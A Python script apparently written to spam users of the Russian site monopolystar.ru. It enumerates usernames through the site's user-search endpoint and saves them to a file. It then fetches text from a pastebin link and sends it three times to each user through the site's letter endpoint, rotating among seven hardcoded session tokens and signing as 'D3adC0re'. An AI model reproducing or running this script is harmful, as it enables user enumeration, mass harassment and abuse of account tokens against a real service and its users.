from json.decoder import JSONDecodeError
import requests
import string
import random
with open('users.txt','w') as f:
  f.write('')

user_terms = ['-','_','@','$','%','~']

for l in string.ascii_letters:
  user_terms.append(l)

for d in string.digits:
  user_terms.append(d)

for l_c in 'АаБбВвГгДдЕеЁёЖжЗзИиЙйКкЛлМмНнОоПпСсТтУуФфХхЦцЧчШшЩщЪъЫыЬьЭэЮюЯя':
  for i in range(4):
    user_terms.append(l_c*int(i+1))

random_num = lambda a,b : int(random.randint(a,b))

nums_count = 100

for n in range(nums_count):
  num1 = random_num(1,9)
  num2 = random_num(1,9)
  num3 = random_num(1,9)
  random_number_to_add = int(str(num1)+str(num2)+str(num3))
  if not str(random_number_to_add) in user_terms:
    user_terms.append(str(random_number_to_add))

users_to_spam = []

print('Terms to find users!: '+''.join(user_terms))

input('Press enter to start find users! ')

for term in user_terms:
  try:
    users = requests.get(f'https://monopolystar.ru/ajax/user.php?term='+term+'&to=user').json()
  except JSONDecodeError:
    print('The users with term: '+term+' not found!')

  for user in users:
    print('Add user: '+user['login'])
    users_to_spam.append(user['login'])

print('Founded: '+str(len(users_to_spam))+' users')

log = open('users.txt','a',encoding='1251',errors='ignore')

for user in users_to_spam:
  log.write(user+'\n')
  
log.close()

count=1
tokens = {
    '13ce71fd79d2e85795f5d61bdab36cc2':'1104974',
    '7865a380405c4c21a62b8b3ff24e508a':'1105028',
    '49474d559232176b7eda39fb08d5500c':'1156722',
    '36507c6ce8b461629e32b5a13a09382f':'1156723',
    'db144c9a44526ab8ecfb578328b1fbd0':'1156725',
    'eff3275514c8e6f41a76cbfa3d85a441':'1156742',
    '22bd1abed66441e35df55f3daf212465':'1157157'}
    
text = requests.get('https://pastebin.com/raw/yTAgwQWd').content
for i in range(3):
    for user in users_to_spam:

      random_token = random.choice(list(tokens.keys()))

      sendletter = requests.post('https://monopolystar.ru/ajax/letters/sendLetter.php',data={
          'to':user,
          'from':tokens[random_token],
          'subgect':'Hello From D3adC0re',
          'bodyTex':str(text)[:random.randint(700,900)]
      },cookies={
          'token':random_token
      }).json()

      count+=1

      print('Send to user: '+user+' with token: '+random_token)
    print('Sended '+str(count)+' letters!')
